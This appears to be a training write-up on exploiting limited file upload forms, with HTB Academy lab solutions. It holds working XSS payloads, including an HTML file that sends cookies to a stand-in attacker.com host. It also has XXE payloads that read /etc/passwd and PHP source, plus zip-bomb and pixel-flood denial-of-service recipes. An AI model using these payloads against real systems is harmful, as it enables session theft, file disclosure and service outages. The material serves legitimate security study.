# Limited File Uploads

> **🛡️ Secure Forms:** Attacking "secure" upload forms with XSS, XXE, and DoS when arbitrary uploads fail

## Overview

So far, we have been mainly dealing with filter bypasses to obtain arbitrary file uploads through a vulnerable web application. While file upload forms with weak filters can be exploited to upload arbitrary files, some upload forms have **secure filters** that may not be exploitable with the techniques we discussed.

However, even if we are dealing with a **limited** (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.

Certain file types, like **SVG**, **HTML**, **XML**, and even some **image** and **document** files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.

---

## Cross-Site Scripting (XSS) Attacks

### HTML File XSS

**Attack Vector:** Upload malicious HTML files containing JavaScript

**Malicious HTML Example:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Malicious HTML</title>
</head>
<body>
    <h1>Legitimate Content</h1>
    <script>
        alert('XSS Triggered from: ' + window.origin);
        fetch('http://attacker.com/steal?cookies=' + document.cookie);
    </script>
</body>
</html>
```

### Image Metadata XSS

**Using exiftool to inject XSS:**
```bash
# Inject XSS payload into Comment field
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

# Verify payload injection
exiftool HTB.jpg
# Output: Comment: "><img src=1 onerror=alert(window.origin)>
```

### SVG XSS Attacks

**Basic SVG XSS Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

---

## XML External Entity (XXE) Attacks

### SVG XXE for System File Reading

**Reading /etc/passwd:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### PHP Source Code Disclosure

**Reading PHP source with base64 encoding:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**Decoding base64 output:**
```bash
# Once you get base64 output from XXE, decode it:
echo "PD9waHAKZWNobyAiSGVsbG8gV29ybGQhIjsKPz4=" | base64 -d
# Output: <?php echo "Hello World!"; ?>
```

---

## Denial of Service (DoS) Attacks

### Decompression Bomb (ZIP)

**Creating a ZIP bomb:**
```bash
# Create a large file filled with zeros
dd if=/dev/zero bs=1M count=1024 of=large_file.txt

# Compress it multiple times
zip bomb1.zip large_file.txt
zip bomb2.zip bomb1.zip  
zip bomb3.zip bomb2.zip
zip final_bomb.zip bomb3.zip

# Result: Small ZIP file that expands to gigabytes
```

### Pixel Flood Attack

**Manual hex editing:**
```bash
# Use hexedit to modify JPG dimensions
hexedit normal.jpg

# Look for FF C0 marker
# Modify bytes at positions:
# Height: Set to FF FF (65535 pixels)
# Width: Set to FF FF (65535 pixels)
```

---

## HTB Academy Lab Solutions

### Lab 1: XXE File Disclosure Attack

**Challenge:** Read `/flag.txt` using XXE through secure upload form

**Step 1: Create SVG with XXE payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="40">&xxe;</text>
</svg>
```

**Step 2: Upload SVG file**
- Save payload as `xxe.svg`
- Upload through the secure form (should accept SVG files)
- Navigate to uploaded file location

**Step 3: View SVG content**
- Access the uploaded SVG file in browser
- Check page source if content is not visible
- Flag should be displayed in SVG text content

**Expected Flag:** `HTB{...}`

### Lab 2: Source Code Disclosure

**Challenge:** Read `upload.php` source code to identify uploads directory

**Step 1: Create PHP source disclosure SVG**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="40">&xxe;</text>
</svg>
```

**Step 2: Upload and access SVG**
- Upload the SVG file
- View the uploaded file
- Copy the base64 encoded content

**Step 3: Decode PHP source**
```bash
# Decode base64 content
echo "base64_content_here" | base64 -d > upload.php

# Look for upload directory in source
grep -i "upload" upload.php
grep -i "dir" upload.php
grep -i "path" upload.php
```

**Expected Answer:** The exact directory name as found in source code

This comprehensive guide demonstrates that even "secure" upload forms can be vulnerable to sophisticated attacks through legitimate file types.
